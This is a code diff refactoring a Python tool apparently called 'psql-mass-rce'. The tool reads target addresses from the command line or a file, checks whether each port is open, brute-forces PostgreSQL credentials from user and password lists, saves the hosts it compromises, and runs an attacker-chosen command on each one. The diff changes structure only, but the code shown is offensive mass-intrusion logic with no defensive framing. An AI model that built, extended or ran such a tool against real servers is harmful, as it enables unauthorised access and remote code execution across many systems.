@@ -116,15 +116,6 @@ class Victim:
             return {'status': 'fail', 'message': str(e)}
 
 
-    def attack(ip, port, userlist, passlist, command):
-        print("[x] Starting host " + ip + ":" + str(port))
-        victim = Victim(ip, port)
-        if victim.port_is_open():
-            if victim.bruteforce(userlist, passlist):
-                Session.save_victim(victim)
-                victim.do_rce(command)
-
-
 class Session:
     good_targets = ['']
     filename = ''
@@ -156,8 +147,13 @@ class Session:
 class InputData:
     def __init__(self):
         self.args = self.parse_cli_args()
-        self.data_for_attack = []
+        self.__data_for_attack = []
         self.compose_data_for_attack()
+
+
+    def get_data_for_attack(self):
+        return self.__data_for_attack
+
 
     @staticmethod
     def parse_cli_args():
@@ -218,7 +214,7 @@ class InputData:
         if self.args.saved: # --saved
             for line in Session.good_targets:
                 data = line.strip().split(':')
-                self.data_for_attack.append([data[0], data[1], [data[2]], [data[3]]])
+                self.__data_for_attack.append([data[0], data[1], [data[2]], [data[3]]])
 
         elif self.args.targets_file: # -iL
             for line in open(self.args.targets_file):
@@ -229,12 +225,13 @@ class InputData:
                     _port = self.args.port
 
                 for ip, port in self.parse_target(data[0], _port):
-                    self.data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
+                    self.__data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
 
         else: # CLI arguments
             for target in self.args.targets:
                 for ip, port in self.parse_target(target, self.args.port):
-                    self.data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
+                    self.__data_for_attack.append([ip, port, self.args.userfile, self.args.passfile])
+
 
 
 def main():
@@ -242,9 +239,13 @@ def main():
     Session.load_session_file('.psql-mass-rce.saved')
     input = InputData()
 
-    for ip, port, userlist, passlist in input.data_for_attack:
-        Victim.attack(ip, port, userlist, passlist, input.args.command)
-
+    for ip, port, userlist, passlist in input.get_data_for_attack():
+        print("[x] Starting host " + ip + ":" + str(port))
+        victim = Victim(ip, port)
+        if victim.port_is_open():
+            if victim.bruteforce(userlist, passlist):
+                Session.save_victim(victim)
+                victim.do_rce(input.args.command)
 
 
 if __name__ == '__main__':
